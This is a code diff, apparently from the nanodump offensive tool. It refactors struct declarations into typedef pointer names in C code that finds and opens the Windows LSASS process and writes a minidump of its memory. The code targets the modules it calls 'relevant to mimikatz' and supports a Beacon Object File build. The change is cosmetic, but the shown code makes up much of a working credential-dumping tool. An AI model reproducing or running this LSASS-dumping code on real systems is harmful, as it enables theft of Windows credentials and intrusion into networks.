@@ -9,7 +9,7 @@
 
 
 void writeat(
-    struct dump_context* dc,
+    Pdump_context dc,
     ULONG32 rva,
     const PVOID data,
     unsigned size
@@ -20,7 +20,7 @@ void writeat(
 }
 
 void append(
-    struct dump_context* dc,
+    Pdump_context dc,
     const PVOID data,
     unsigned size
 )
@@ -479,10 +479,10 @@ ULONG32 convert_to_little_endian(
 }
 
 void write_header(
-    struct dump_context* dc
+    Pdump_context dc
 )
 {
-    struct MiniDumpHeader header;
+    MiniDumpHeader header;
     // the signature might or might not be valid
     header.Signature = convert_to_little_endian(
         *(ULONG32*)(dc->signature)
@@ -511,8 +511,8 @@ void write_header(
 }
 
 void write_directory(
-    struct dump_context* dc,
-    struct MiniDumpDirectory directory
+    Pdump_context dc,
+    MiniDumpDirectory directory
 )
 {
     byte directory_bytes[12];
@@ -524,22 +524,22 @@ void write_directory(
 }
 
 void write_directories(
-    struct dump_context* dc
+    Pdump_context dc
 )
 {
-    struct MiniDumpDirectory system_info_directory;
+    MiniDumpDirectory system_info_directory;
     system_info_directory.StreamType = 7; // SystemInfoStream
     system_info_directory.DataSize = 0; // this is calculated and written later
     system_info_directory.Rva = 0; // this is calculated and written later
     write_directory(dc, system_info_directory);
 
-    struct MiniDumpDirectory module_list_directory;
+    MiniDumpDirectory module_list_directory;
     module_list_directory.StreamType = 4; // ModuleListStream
     module_list_directory.DataSize = 0; // this is calculated and written later
     module_list_directory.Rva = 0; // this is calculated and written later
     write_directory(dc, module_list_directory);
 
-    struct MiniDumpDirectory memory64_list_directory;
+    MiniDumpDirectory memory64_list_directory;
     memory64_list_directory.StreamType = 9; // Memory64ListStream
     memory64_list_directory.DataSize = 0; // this is calculated and written later
     memory64_list_directory.Rva = 0; // this is calculated and written later
@@ -547,10 +547,10 @@ void write_directories(
 }
 
 BOOL write_system_info_stream(
-    struct dump_context* dc
+    Pdump_context dc
 )
 {
-    struct MiniDumpSystemInfo system_info;
+    MiniDumpSystemInfo system_info;
 
     // read the version and build numbers from the PEB
     PVOID pPeb;
@@ -687,7 +687,7 @@ PVOID get_peb_address(
     return basic_info.PebBaseAddress;
 }
 
-struct module_info* find_modules(
+Pmodule_info find_modules(
     HANDLE hProcess,
     wchar_t* important_modules[],
     int number_of_important_modules,
@@ -695,7 +695,7 @@ struct module_info* find_modules(
 )
 {
     // module list
-    struct module_info* module_list = NULL;
+    Pmodule_info module_list = NULL;
     BOOL lsasrv_found = FALSE;
     SHORT pointer_size;
     PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address, first_ldr_entry_address;
@@ -835,7 +835,7 @@ struct module_info* find_modules(
                 if (!MSVCRT$_wcsicmp(important_modules[i], L"lsasrv.dll"))
                     lsasrv_found = TRUE;
 
-                struct module_info* new_module = (struct module_info*)intAlloc(sizeof(struct module_info));
+                Pmodule_info new_module = (Pmodule_info)intAlloc(sizeof(module_info));
                 if (!new_module)
                 {
 #ifdef BOF
@@ -844,7 +844,7 @@ struct module_info* find_modules(
                     printf(
 #endif
                         "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-                        (ULONG32)sizeof(struct module_info),
+                        (ULONG32)sizeof(module_info),
                         KERNEL32$GetLastError());
                     return NULL;
                 }
@@ -878,7 +878,7 @@ struct module_info* find_modules(
                 }
                 else
                 {
-                    struct module_info* last_module = module_list;
+                    Pmodule_info last_module = module_list;
                     while (last_module->next)
                         last_module = last_module->next;
                     last_module->next = new_module;
@@ -907,8 +907,8 @@ struct module_info* find_modules(
     return module_list;
 }
 
-struct module_info* write_module_list_stream(
-    struct dump_context* dc
+Pmodule_info write_module_list_stream(
+    Pdump_context dc
 )
 {
     // list of modules relevant to mimikatz
@@ -918,7 +918,7 @@ struct module_info* write_module_list_stream(
         L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll", L"eventlog.dll",
         L"wevtsvc.dll", L"termsrv.dll", L"cloudap.dll"
     };
-    struct module_info* module_list = find_modules(
+    Pmodule_info module_list = find_modules(
         dc->hProcess,
         important_modules,
         ARRAY_SIZE(important_modules),
@@ -928,7 +928,7 @@ struct module_info* write_module_list_stream(
         return NULL;
 
     // write the full path of each dll
-    struct module_info* curr_module = module_list;
+    Pmodule_info curr_module = module_list;
     ULONG32 number_of_modules = 0;
     while(curr_module)
     {
@@ -951,7 +951,7 @@ struct module_info* write_module_list_stream(
     curr_module = module_list;
     while (curr_module)
     {
-        struct MiniDumpModule module;
+        MiniDumpModule module;
         module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
         module.SizeOfImage = curr_module->size_of_image;
         module.CheckSum = 0;
@@ -1025,7 +1025,7 @@ void free_linked_list(
         return;
 
     ULONG32 number_of_nodes = 1;
-    struct linked_list* node = (struct linked_list*)head;
+    Plinked_list node = (Plinked_list)head;
     while(node->next)
     {
         number_of_nodes++;
@@ -1034,7 +1034,7 @@ void free_linked_list(
 
     for (int i = number_of_nodes - 1; i >= 0; i--)
     {
-        struct linked_list* node = (struct linked_list*)head;
+        Plinked_list node = (Plinked_list)head;
 
         int jumps = i;
         while(jumps--)
@@ -1046,10 +1046,10 @@ void free_linked_list(
 
 BOOL is_important_module(
     PVOID address,
-    struct module_info* module_list
+    Pmodule_info module_list
 )
 {
-    struct module_info* curr_module = module_list;
+    Pmodule_info curr_module = module_list;
     while (curr_module)
     {
         if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
@@ -1060,12 +1060,12 @@ BOOL is_important_module(
     return FALSE;
 }
 
-struct MiniDumpMemoryDescriptor64* get_memory_ranges(
-    struct dump_context* dc,
-    struct module_info* module_list
+PMiniDumpMemoryDescriptor64 get_memory_ranges(
+    Pdump_context dc,
+    Pmodule_info module_list
 )
 {
-    struct MiniDumpMemoryDescriptor64 *ranges_list = NULL;
+    PMiniDumpMemoryDescriptor64 ranges_list = NULL;
     PVOID base_address, current_address;
     ULONG64 region_size;
     current_address = 0;
@@ -1109,7 +1109,7 @@ struct MiniDumpMemoryDescriptor64* get_memory_ranges(
                 module_list))
             continue;
 
-        struct MiniDumpMemoryDescriptor64 *new_range = (struct MiniDumpMemoryDescriptor64*)intAlloc(sizeof(struct MiniDumpMemoryDescriptor64));
+        PMiniDumpMemoryDescriptor64 new_range = (PMiniDumpMemoryDescriptor64)intAlloc(sizeof(MiniDumpMemoryDescriptor64));
         if(!new_range)
         {
 #ifdef BOF
@@ -1118,7 +1118,7 @@ struct MiniDumpMemoryDescriptor64* get_memory_ranges(
             printf(
 #endif
                 "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-                (ULONG32)sizeof(struct MiniDumpMemoryDescriptor64),
+                (ULONG32)sizeof(MiniDumpMemoryDescriptor64),
                 KERNEL32$GetLastError());
             return NULL;
         }
@@ -1132,7 +1132,7 @@ struct MiniDumpMemoryDescriptor64* get_memory_ranges(
         }
         else
         {
-            struct MiniDumpMemoryDescriptor64* last_range = ranges_list;
+            PMiniDumpMemoryDescriptor64 last_range = ranges_list;
             while (last_range->next)
                 last_range = last_range->next;
             last_range->next = new_range;
@@ -1141,14 +1141,14 @@ struct MiniDumpMemoryDescriptor64* get_memory_ranges(
     return ranges_list;
 }
 
-struct MiniDumpMemoryDescriptor64* write_memory64_list_stream(
-    struct dump_context* dc,
-    struct module_info* module_list
+PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
+    Pdump_context dc,
+    Pmodule_info module_list
 )
 {
     ULONG32 stream_rva = dc->rva;
 
-    struct MiniDumpMemoryDescriptor64* memory_ranges = get_memory_ranges(
+    PMiniDumpMemoryDescriptor64 memory_ranges = get_memory_ranges(
         dc,
         module_list
     );
@@ -1157,7 +1157,7 @@ struct MiniDumpMemoryDescriptor64* write_memory64_list_stream(
 
     // write the number of ranges
     ULONG64 number_of_ranges = 1;
-    struct MiniDumpMemoryDescriptor64* curr_range = memory_ranges;
+    PMiniDumpMemoryDescriptor64 curr_range = memory_ranges;
     while(curr_range->next && number_of_ranges++)
         curr_range = curr_range->next;
     append(dc, &number_of_ranges, 8);
@@ -1228,7 +1228,7 @@ struct MiniDumpMemoryDescriptor64* write_memory64_list_stream(
 }
 
 BOOL NanoDumpWriteDump(
-    struct dump_context* dc
+    Pdump_context dc
 )
 {
     write_header(dc);
@@ -1238,12 +1238,12 @@ BOOL NanoDumpWriteDump(
     if (!write_system_info_stream(dc))
         return FALSE;
 
-    struct module_info* module_list;
+    Pmodule_info module_list;
     module_list = write_module_list_stream(dc);
     if (!module_list)
         return FALSE;
 
-    struct MiniDumpMemoryDescriptor64* memory_ranges;
+    PMiniDumpMemoryDescriptor64 memory_ranges;
     memory_ranges = write_memory64_list_stream(dc, module_list);
     if (!memory_ranges)
         return FALSE;
@@ -1259,7 +1259,7 @@ BOOL is_lsass(HANDLE hProcess)
 {
     // if the process has 'lsass.exe' loaded, then we found LSASS
     wchar_t* module_name[] = { L"lsass.exe" };
-    struct module_info* module_list = find_modules(
+    Pmodule_info module_list = find_modules(
         hProcess,
         module_name,
         ARRAY_SIZE(module_name),
@@ -1757,7 +1757,6 @@ void go(char* args, int length)
     }
 
     HANDLE hProcess;
-
     if (pid)
     {
         if (fork)
@@ -1782,7 +1781,9 @@ void go(char* args, int length)
         }
     }
     else
+    {
         hProcess = find_lsass();
+    }
     if (!hProcess)
         return;
 
@@ -1795,7 +1796,7 @@ void go(char* args, int length)
         return;
     }
 
-    struct dump_context dc;
+    dump_context dc;
     dc.hProcess = hProcess;
     dc.BaseAddress = BaseAddress;
     dc.rva = 0;
@@ -1895,7 +1896,7 @@ int main(int argc, char* argv[])
         printf(
             "Nanodump does not support WoW64\n"
         );
-        return 0;
+        return -1;
     }
 #endif
 
@@ -2009,7 +2010,9 @@ int main(int argc, char* argv[])
         }
     }
     else
+    {
         hProcess = find_lsass();
+    }
     if (!hProcess)
         return -1;
 
@@ -2022,7 +2025,7 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    struct dump_context dc;
+    dump_context dc;
     dc.hProcess = hProcess;
     dc.BaseAddress = BaseAddress;
     dc.rva = 0;
